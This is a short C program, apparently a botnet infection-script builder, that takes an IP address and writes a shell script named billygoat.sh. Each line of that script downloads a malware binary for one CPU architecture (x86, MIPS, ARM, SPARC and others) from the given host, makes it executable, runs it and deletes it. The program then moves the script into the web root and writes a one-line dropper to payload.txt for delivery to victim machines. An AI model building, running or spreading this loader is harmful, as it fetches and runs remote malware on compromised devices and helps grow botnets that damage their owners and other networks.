#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>

int main(int argc, char *argv[])
{
	
	if(argc != 2) {
		printf("Usage: %s IP\n", argv[0]);
		exit(0);
	}
	
	char buf[1000] = {0};
	char *ip;
	ip = argv[1];
	
	printf("Making SH File\n");
	sprintf(buf, "echo 'wget http://%s/x86_64;chmod 777 x86_64;./x86_64;rm -rf x86_64' >> billygoat.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/x86_32;chmod 777 x86_32;./x86_32;rm -rf x86_32' >> billygoat.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/sparc;chmod 777 sparc;./sparc;rm -rf sparc' >> billygoat.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/sh4;chmod 777 sh4;./sh4;rm -rf .sh4' >> billygoat.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/powerpc;chmod 777 powerpc;./powerpc;rm -rf .powerpc' >> billygoat.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/mipsel;chmod 777 mipsel;./mipsel;rm -rf .mipsel' >> billygoat.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/mips;chmod 777 mips;./mips;rm -rf .mips' >> billygoat.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/m68k;chmod 777 m68k;./m68k;rm -rf .m68k' >> billygoat.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/i686;chmod 777 i686;./i686;rm -rf .i686' >> billygoat.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/arm5;chmod 777 arm5;./arm5;rm -rf .arm5' >> billygoat.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/arm;chmod 777 arm;./arm;rm -rf .arm' >> billygoat.sh", ip);
	system(buf);
	printf("Finished Making SH FILE\n");
	sleep(1);
	printf("Moving SH File\n");
	system("mv billygoat.sh /var/www/html");
	sleep(1);
	printf("Payload in text file!\n");
	sprintf(buf, "echo 'cd /tmp || cd /etc;wget http://%s/billygoat.sh;chmod 777 billygoat.sh;./billygoat.sh;rm -rf billygoat.sh' >> payload.txt", ip);
	system(buf);
	exit(0);
}